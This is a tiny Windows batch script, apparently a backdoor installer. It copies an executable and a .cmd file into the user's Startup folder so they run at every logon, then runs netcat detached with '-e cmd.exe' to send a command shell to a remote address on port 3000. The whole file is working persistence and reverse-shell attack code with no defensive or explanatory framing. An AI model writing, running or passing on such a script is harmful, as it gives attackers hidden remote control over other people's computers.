copy fila.exe  "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
copy conexao.cmd  "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"

cd nc
nc ip 3000 -d -e cmd.exe 